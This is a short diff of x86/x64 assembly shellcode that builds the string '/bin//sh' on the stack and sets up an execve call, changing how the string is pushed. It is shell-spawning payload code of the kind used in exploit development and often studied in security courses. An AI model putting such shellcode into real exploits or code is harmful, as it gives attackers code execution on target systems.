@@ -36,14 +36,16 @@
     xor     esi, esi    ; argv = 0
     mul     esi         ; eax = 0, edx = 0 
     push    edx         ; '\0'
-    push    edx         ; null space
-    push    edx         ; null space
+    push    '//sh'
+    push    '/bin'
+    ;push    edx         ; null space
+    ;push    edx         ; null space
     push    esp
     pop     ebx         ; ebx = "/bin//sh", 0
     push    ebx         ; save pointer to "/bin//sh", 0
     pop     edi         ; rdi="/bin//sh", 0
-    mov     dword[edi+0], '/bin'
-    mov     dword[edi+4], '//sh'
+    ;mov     dword[edi+0], '/bin'
+    ;mov     dword[edi+4], '//sh'
     inc     eax
     jnz     x32
     mov     al, 59      ; rax = sys_execve
